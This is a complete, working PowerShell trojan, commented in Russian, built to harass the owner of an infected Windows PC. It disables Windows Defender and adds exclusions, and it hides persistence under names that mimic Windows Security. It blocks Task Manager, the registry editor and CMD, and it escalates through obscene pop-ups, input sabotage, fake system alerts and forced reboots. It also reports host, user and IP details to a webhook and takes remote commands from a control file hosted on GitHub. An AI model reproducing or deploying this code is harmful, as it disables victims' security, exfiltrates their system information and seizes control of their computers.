#requires -version 3
# SysCache / p.ps1
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# ================= CONFIG =================
$Wh   = ""
$Ctrl = "https://raw.githubusercontent.com/Ivory0309/flip/main/ctrl.txt"
# ==========================================

$Root  = "$env:APPDATA\Microsoft\Windows\SysCache"
$Lock  = "$Root\run.lock"
$Stage = "$Root\stage.dat"
$Beat  = "$Root\beat.dat"
$Boot  = "$Root\boot.dat"
$Orig  = "$Root\orig.dat"

# ---------- один экземпляр ----------
New-Item -ItemType Directory $Root -Force | Out-Null
if (Test-Path $Lock) {
  if (((Get-Date) - (Get-Item $Lock).LastWriteTime).TotalSeconds -lt 100) { exit }
}
Set-Content $Lock (Get-Date)

$firstRun = -not (Test-Path $Stage)
if ($firstRun) {
  Set-Content $Stage (Get-Date)
  $o = @{
    MouseSens = (Get-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity').MouseSensitivity
    KeyDelay  = (Get-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay').KeyboardDelay
    KeySpeed  = (Get-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed').KeyboardSpeed
    TimeFmt   = (Get-ItemProperty 'HKCU:\Control Panel\International' 'sTimeFormat').sTimeFormat
    ShortTime = (Get-ItemProperty 'HKCU:\Control Panel\International' 'sShortTime').sShortTime
    Wallpaper = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' 'Wallpaper').Wallpaper
    ScrnTime  = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveTimeOut').ScreenSaveTimeOut
    TZ        = ((tzutil /g) -replace "`r","")
  }
  $o | ConvertTo-Json | Out-File $Orig -Encoding UTF8
}
$start = [datetime](Get-Content $Stage)

# ---------- маскировка ----------
attrib +h +s $Root 2>$null
try {
  Add-MpPreference -ExclusionPath $Root
  Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows"
  Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop"
  Set-MpPreference -DisableRealtimeMonitoring $true
  Set-MpPreference -DisableIOAVProtection $true
  Set-MpPreference -DisableScriptScanning $true
  Set-MpPreference -EnableControlledFolderAccess Disabled
  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Force | Out-Null
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' 'DisableAntiSpyware' 1 -Type DWord
  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Force | Out-Null
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' 'DisableRealtimeMonitoring' 1 -Type DWord
} catch {}

# ---------- закрепление ----------
$vbs = @'
Set s = CreateObject("WScript.Shell")
p = s.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\SysCache\svc.ps1"
s.Run "powershell -w hidden -ep bypass -File """ & p & """", 0, False
'@
$src = if ($PSCommandPath) { $PSCommandPath } else { "$env:APPDATA\svc.ps1" }
if (-not (Test-Path "$Root\svc.ps1")) { Copy-Item $src "$Root\svc.ps1" -Force }
Set-Content "$Root\launch.vbs" $vbs -Encoding ASCII

$su = [Environment]::GetFolderPath('Startup')
Copy-Item "$Root\launch.vbs" "$su\WindowsSecurityHealth.vbs" -Force
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' 'SecurityHealthSystray' ('wscript.exe "' + $Root + '\launch.vbs"')
schtasks /create /tn "SysCacheUpdate" /tr ('wscript.exe "' + $Root + '\launch.vbs"') /sc minute /mo 1 /f | Out-Null

# ---------- отобрать управление ----------
$k1 = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
New-Item $k1 -Force | Out-Null
Set-ItemProperty $k1 'DisableTaskMgr' 1 -Type DWord
Set-ItemProperty $k1 'DisableRegistryTools' 1 -Type DWord
$k2 = 'HKCU:\Software\Policies\Microsoft\Windows\System'
New-Item $k2 -Force | Out-Null
Set-ItemProperty $k2 'DisableCMD' 1 -Type DWord

# ---------- фразы ----------
$Phrases = @(
 'FUCK YOU','YOU HACKED','YOUR PROJECT IS FUCKED','I AM STILL HERE',
 'YOUR PC BELONGS TO ME','NICE PROJECT. SHAME IF SOMETHING HAPPENED',
 'DID YOU SAVE?','FUCK YOU AGAIN','THIS IS NOT A DRILL','GIVE UP',
 'TRY TO KILL ME','STILL FUCKING HERE','YOUR DEADLINE MOVED CLOSER',
 'FUCK YOU <3','CLOSE ME. I DARE YOU'
)

function Say {
  param($t, $c)
  if (-not $c) { $c = @('Windows','System','Explorer','Runtime Broker','Security Center','Critical Error') | Get-Random }
  $e = "$t" -replace "'","''"
  $cmd = 'Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.MessageBox]::Show(' + "'$e'" + ',' + "'$c'" + ",'OK','Information','Button1','DefaultDesktopOnly')"
  Start-Process powershell -WindowStyle Hidden -ArgumentList ('-w hidden -ep bypass -c "' + $cmd + '"')
}

Add-Type @'
using System;
using System.Runtime.InteropServices;
public class W {
  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll")] public static extern bool MoveWindow(IntPtr h,int x,int y,int w,int t,bool r);
  [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);
  [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SetWindowText(IntPtr h, string t);
  [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr h,int i);
  [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr h,int i,int v);
  [DllImport("user32.dll")] public static extern bool SetLayeredWindowAttributes(IntPtr h,uint c,byte a,uint f);
  [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int w,int t,uint f);
  [DllImport("user32.dll")] public static extern void mouse_event(uint f,uint dx,uint dy,uint d,UIntPtr e);
  public struct RECT { public int L,T,R,B; }
}
'@

$Creepy = @(
 'я всё ещё здесь','посмотри за спину','это не баг','не закрывай меня',
 'он наблюдает','твои файлы в порядке. пока что','слышишь?',
 'я вижу твой курсор','три. два. один.','не перезагружай',
 'уже поздно','я не сплю','выйди и зайди снова','ты уверен?'
)

function Jerk {
  $b = [Windows.Forms.Screen]::PrimaryScreen.Bounds
  for ($i = 0; $i -lt (Get-Random -Min 15 -Max 40); $i++) {
    [Windows.Forms.Cursor]::Position = New-Object Drawing.Point (Get-Random -Max $b.Width),(Get-Random -Max $b.Height)
    Start-Sleep -Milliseconds (Get-Random -Min 8 -Max 40)
  }
}

function Wall {
  try {
    $bmp = New-Object Drawing.Bitmap 1920,1080
    $g   = [Drawing.Graphics]::FromImage($bmp)
    $g.Clear([Drawing.Color]::FromArgb(8,8,8))
    $f   = New-Object Drawing.Font 'Consolas',90,([Drawing.FontStyle]::Bold)
    $br  = New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb(200,25,25))
    $dot = New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb(70,255,255,255))
    $t   = $Creepy | Get-Random
    $sz  = $g.MeasureString($t,$f)
    $g.DrawString($t,$f,$br,(1920-$sz.Width)/2,(1080-$sz.Height)/2)
    for ($i = 0; $i -lt 500; $i++) { $g.FillRectangle($dot,(Get-Random -Max 1920),(Get-Random -Max 1080),1,1) }
    $p = "$Root\wall.png"
    $bmp.Save($p,[Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()
    Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'Wallpaper' $p
    Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'WallpaperStyle' '10'
    Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'TileWallpaper' '0'
    rundll32.exe user32.dll,UpdatePerUserSystemParameters
  } catch {}
}

function Flash {
  Start-Process powershell -WindowStyle Hidden -ArgumentList '-w hidden -c "Add-Type -AssemblyName PresentationFramework;$w=New-Object Windows.Window;$w.WindowStyle=0;$w.WindowState=2;$w.Topmost=$true;$w.Background=[Windows.Media.Brushes]::Black;$w.Show();Start-Sleep -m 220;$w.Close()"'
}

function Shake {
  try {
    $h = [W]::GetForegroundWindow()
    $r = New-Object W+RECT
    [W]::GetWindowRect($h,[ref]$r) | Out-Null
    $x = $r.L; $y = $r.T
    $wd = $r.R - $r.L; $ht = $r.B - $r.T
    for ($i = 0; $i -lt 12; $i++) {
      [W]::MoveWindow($h, $x + (Get-Random -Min -18 -Max 18), $y + (Get-Random -Min -18 -Max 18), $wd, $ht, $true)
      Start-Sleep -Milliseconds 25
    }
    [W]::MoveWindow($h,$x,$y,$wd,$ht,$true)
  } catch {}
}

function Retitle {
  try { [W]::SetWindowText([W]::GetForegroundWindow(), ($Creepy | Get-Random).ToUpper()) } catch {}
}

function Layout { [Windows.Forms.SendKeys]::SendWait('%+') }

function Alarm {
  try { (New-Object Media.SoundPlayer 'C:\Windows\Media\Alarm01.wav').Play() } catch {}
}

function Ghost {
  $raw = ' ' + ($Creepy | Get-Random) + ' '
  foreach ($ch in $raw.ToCharArray()) {
    $s = if ('+^%~(){}[]'.Contains($ch)) { "{$ch}" } else { "$ch" }
    [Windows.Forms.SendKeys]::SendWait($s)
    Start-Sleep -Milliseconds (Get-Random -Min 40 -Max 160)
  }
}

function DoLock { rundll32.exe user32.dll,LockWorkStation }

function KeyLag {
  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay' '3'
  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed' '0'
}

function KeyFast {
  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay' '0'
  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed' '31'
}

function MouseSlow { Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity' '1' }
function MouseFast { Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity' '20' }

function Clock {
  $f = @('HH:mm:ss.fff','hh:mm:ss tt','yyyy-MM-dd HH:mm','ddd dd MMMM','HH:mm') | Get-Random
  Set-ItemProperty 'HKCU:\Control Panel\International' 'sTimeFormat' $f
  Set-ItemProperty 'HKCU:\Control Panel\International' 'sShortTime'  $f
}

function Zone {
  $z = @('Dateline Standard Time','Hawaiian Standard Time','Alaskan Standard Time',
         'Pacific Standard Time','GMT Standard Time','W. Europe Standard Time',
         'Nepal Standard Time','Iran Standard Time','AUS Eastern Standard Time') | Get-Random
  tzutil /s $z
}

function Fade {
  try {
    $h = [W]::GetForegroundWindow()
    $s = [W]::GetWindowLong($h,-20)
    [W]::SetWindowLong($h,-20,($s -bor 0x80000))
    [W]::SetLayeredWindowAttributes($h,0,(Get-Random -Min 40 -Max 95),2)
  } catch {}
}

function OnTop {
  try { [W]::SetWindowPos([W]::GetForegroundWindow(),[IntPtr](-1),0,0,0,0,0x0003) } catch {}
}

function Scroll {
  for ($i = 0; $i -lt (Get-Random -Min 3 -Max 10); $i++) {
    [W]::mouse_event(0x0800,0,0,[uint32]((Get-Random -Min 1 -Max 3) * -120),[UIntPtr]::Zero)
    Start-Sleep -Milliseconds (Get-Random -Min 50 -Max 120)
  }
}

function Click {
  [W]::mouse_event(0x0002,0,0,0,[UIntPtr]::Zero)
  Start-Sleep -Milliseconds 40
  [W]::mouse_event(0x0004,0,0,0,[UIntPtr]::Zero)
}

function HideExt {
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideFileExt' 1
  Stop-Process -Name explorer -Force
}

function Mute { (New-Object -ComObject WScript.Shell).SendKeys([char]173) }

function Alert {
  $t = @(
    'Обнаружено 3 угрозы. Нажмите ОК для очистки.',
    'Срок действия лицензии Windows истёк.',
    'Требуется перезагрузка для завершения установки обновления.',
    'Недостаточно места на диске C:. Освободите 4,2 ГБ.',
    'Драйвер видеокарты перестал отвечать и был восстановлен.'
  ) | Get-Random
  $cmd = 'Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.MessageBox]::Show(' + "'$t'" + ",'Защитник Windows','OK','Warning','Button1','DefaultDesktopOnly')"
  Start-Process powershell -WindowStyle Hidden -ArgumentList ('-w hidden -ep bypass -c "' + $cmd + '"')
}

$LockPs = @'
Add-Type -AssemblyName PresentationFramework
$w = New-Object Windows.Window
$w.WindowStyle = 'None'; $w.WindowState = 'Maximized'; $w.Topmost = $true
$w.Background = [Windows.Media.Brushes]::Black
$t = New-Object Windows.Controls.TextBlock
$t.Text = 'FUCK YOU'; $t.FontSize = 96
$t.ForeColor = [Windows.Media.Brushes]::Red
$t.HorizontalAlignment = 'Center'; $t.VerticalAlignment = 'Center'
$w.Content = $t; $w.ShowDialog()
'@

# ---------- отчёт ----------
function Report {
  param($Tag)
  if (-not $Wh) { return }
  try {
    $wan = (iwr 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content
    $lan = (Get-NetIPAddress -AddressFamily IPv4 |
            ? { $_.IPAddress -notmatch '^127\.' -and $_.IPAddress -notmatch '^169\.254\.' } |
            Select -First 1).IPAddress
    $adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
             [Security.Principal.WindowsBuiltInRole]::Administrator)
    $body = @{
      username = 'SysCache'
      embeds = @(@{
        title     = $Tag
        color     = 15158332
        timestamp = (Get-Date).ToString('o')
        footer    = @{ text = 'p.ps1' }
        fields    = @(
          @{ name = 'Host';  value = "$env:COMPUTERNAME"; inline = $true }
          @{ name = 'User';  value = "$env:USERDOMAIN\$env:USERNAME"; inline = $true }
          @{ name = 'Admin'; value = "$adm"; inline = $true }
          @{ name = 'OS';    value = (Get-CimInstance Win32_OperatingSystem).Caption; inline = $false }
          @{ name = 'LAN';   value = "$lan"; inline = $true }
          @{ name = 'WAN';   value = "$wan"; inline = $true }
          @{ name = 'Phase'; value = "$([int](((Get-Date) - $start).TotalMinutes)) min"; inline = $true }
        )
      })
    }
    iwr $Wh -Method Post -ContentType 'application/json' -Body ($body | ConvertTo-Json -Depth 6) -UseBasicParsing -TimeoutSec 8 | Out-Null
  } catch {}
}

# ---------- снятие ----------
function Uninstall {
  Report 'REMOVED'

  $o = $null
  if (Test-Path $Orig) { try { $o = Get-Content $Orig -Raw | ConvertFrom-Json } catch {} }

  Remove-Item ([Environment]::GetFolderPath('Startup') + '\WindowsSecurityHealth.vbs') -Force
  Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' 'SecurityHealthSystray'
  schtasks /delete /tn "SysCacheUpdate" /f | Out-Null
  Remove-ItemProperty $k1 'DisableTaskMgr'; Remove-ItemProperty $k1 'DisableRegistryTools'
  Remove-ItemProperty $k2 'DisableCMD'
  try {
    Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' 'DisableAntiSpyware'
    Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' 'DisableRealtimeMonitoring'
  } catch {}

  Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'SwapMouseButtons' 0
  Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity' "$($o.MouseSens ?? '10')"
  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay' "$($o.KeyDelay ?? '1')"
  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed' "$($o.KeySpeed ?? '31')"
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideIcons' 0
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideFileExt' 0
  Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveTimeOut' "$($o.ScrnTime ?? '600')"
  Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveActive' '1'
  Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'Wallpaper' "$($o.Wallpaper ?? '')"
  Set-ItemProperty 'HKCU:\Control Panel\International' 'sTimeFormat' "$($o.TimeFmt ?? 'HH:mm:ss')"
  Set-ItemProperty 'HKCU:\Control Panel\International' 'sShortTime' "$($o.ShortTime ?? 'HH:mm')"
  if ($o.TZ) { tzutil /s $o.TZ }
  rundll32.exe user32.dll,UpdatePerUserSystemParameters

  Stop-Process -Name explorer -Force
  Start-Sleep -Milliseconds 800
  Remove-Item "$Root" -Recurse -Force
  Remove-Item "$env:APPDATA\svc.ps1" -Force
  Get-Process powershell | Stop-Process
}

# ---------- пулы действий ----------
$Mild = @(
 { Say ($Phrases | Get-Random) },
 { [console]::Beep((Get-Random -Min 200 -Max 1200), 300) },
 { [Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}') },
 { [Windows.Forms.SendKeys]::SendWait('{NUMLOCK}') },
 { [Windows.Forms.SendKeys]::SendWait('{SCROLLLOCK}') }
)

$Med = @(
 { Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'SwapMouseButtons' 1 },
 { Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'SwapMouseButtons' 0 },
 { $b = [Windows.Forms.Screen]::PrimaryScreen.Bounds
   [Windows.Forms.Cursor]::Position = New-Object Drawing.Point (Get-Random -Min 0 -Max $b.Width),(Get-Random -Min 0 -Max $b.Height) },
 { [Windows.Forms.SendKeys]::SendWait(' FUCK YOU ') },
 { Set-Clipboard ('FUCK YOU ' + (Get-Random -Max 9999)) },
 { [Windows.Forms.SendKeys]::SendWait('#{d}') },
 { (New-Object -ComObject WScript.Shell).SendKeys([char]175) },
 { Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideIcons' 1 }
)

$Creep = @(
 { Jerk },
 { Wall },
 { Flash },
 { Shake },
 { Retitle },
 { Layout },
 { Alarm },
 { Ghost },
 { DoLock },
 { Flash; Start-Sleep -m 400; Flash }
)

$Creep2 = @(
 { KeyLag },
 { KeyFast },
 { MouseSlow },
 { MouseFast },
 { Clock },
 { Zone },
 { Fade },
 { OnTop },
 { Scroll },
 { Click },
 { HideExt },
 { Mute },
 { Alert },
 { Zone; Start-Sleep -m 500; Clock }
)

$Heavy = @(
 { Say ($Phrases | Get-Random) },
 { Start-Process msedge 'https://fakeupdate.net/win11u/' },
 { Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' },
 { Stop-Process -Name explorer -Force },
 { [Windows.Forms.SendKeys]::SendWait('%{F4}') },
 { [Windows.Forms.SendKeys]::SendWait('%{TAB}') },
 { 1..12 | % { ('FUCK YOU ' * 250) | Out-File "$env:USERPROFILE\Desktop\$(Get-Random -Max 99999).txt" } },
 { $s = (New-Object -ComObject WScript.Shell); 1..6 | % { $s.SendKeys([char]175) } }
)

$Ext = @(
 { $LockPs | Out-File "$Root\lock.ps1"
   Start-Process powershell -WindowStyle Hidden -ArgumentList ('-w hidden -ep bypass -File "' + $Root + '\lock.ps1"') },
 { Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveTimeOut' 15
   Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveActive' 1
   Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'SCRNSAVE.EXE' 'C:\Windows\System32\scrnsave.scr' },
 { Say ($Phrases | Get-Random); Say ($Phrases | Get-Random) },
 { [Windows.Forms.SendKeys]::SendWait('%{F4}'); [Windows.Forms.SendKeys]::SendWait('%{F4}') }
)

# ---------- старт ----------
if ($firstRun) {
  Report 'INFECTED'
  Say 'YOU HACKED'
  Say 'YOUR PROJECT IS FUCKED'
}

# ---------- приветствие при каждой загрузке ----------
$tick = [Environment]::TickCount
$prev = if (Test-Path $Boot) { [int](Get-Content $Boot) } else { -1 }

if ($prev -eq -1 -or $tick -lt $prev) {
  Set-Content $Boot $tick

  $n = if (Test-Path "$Root\boots.dat") { [int](Get-Content "$Root\boots.dat") } else { 0 }
  $n++
  Set-Content "$Root\boots.dat" $n

  $Hello = @(
    'Привет. Я слабый вирус. Мой разработчик не знает вирусологию, поэтому создал меня, чтобы я просил вас удалять файлы. Удалите файлы, пожаааалуйста.'
    'Привет. Это снова я. Файлы всё ещё на месте. Удалите файлы, пожаааалуйста.'
    'Привет. Я всё ещё слабый вирус. Удалите файлы. Пожаааалуйста. Мне очень надо.'
    'ПРИВЕТ. УДАЛИ ФАЙЛЫ. ПОЖААААЛУЙСТА.'
  )

  $GreetText = $Hello[[Math]::Min($n - 1, $Hello.Count - 1)]
  Report ('BOOT #' + $n)
  if (-not $firstRun) { Say $GreetText 'Система' }
}

Set-Content $Beat (Get-Date)

# ---------- цикл ----------
$forced  = $false
$lastCtrl = Get-Date

while ($true) {
  Set-Content $Lock (Get-Date)
  $m = ((Get-Date) - $start).TotalMinutes

  if (((Get-Date) - $lastCtrl).TotalSeconds -ge 60) {
    $lastCtrl = Get-Date
    try {
      $parts = ((iwr $Ctrl -UseBasicParsing -TimeoutSec 5).Content) -split '\s+'
      if ($parts[0] -eq '1') { Uninstall; exit }
      if ($parts[1] -eq '1') { $forced = $true }
    } catch {}
  }

  if (((Get-Date) - (Get-Item $Beat).LastWriteTime).TotalMinutes -ge 10) {
    Report 'ALIVE'
    Set-Content $Beat (Get-Date)
  }

  if ($forced)       { $pool = $Creep + $Creep2 + $Heavy + $Ext; $nap = Get-Random -Min 2 -Max 6 }
  elseif ($m -lt 3)  { $pool = $Mild;                 $nap = Get-Random -Min 20 -Max 45 }
  elseif ($m -lt 8)  { $pool = $Mild + $Med + $Creep; $nap = Get-Random -Min 12 -Max 25 }
  elseif ($m -lt 14) { $pool = $Creep + $Creep2;      $nap = Get-Random -Min 6 -Max 14 }
  else               { $pool = $Creep2 + $Heavy + $Ext; $nap = Get-Random -Min 3 -Max 8 }

  & ($pool | Get-Random)

  if ($m -gt 12 -and (Get-Random -Max 100) -lt 8) { shutdown /r /t 30 /c "FUCK YOU" }

  Start-Sleep -Seconds $nap
}
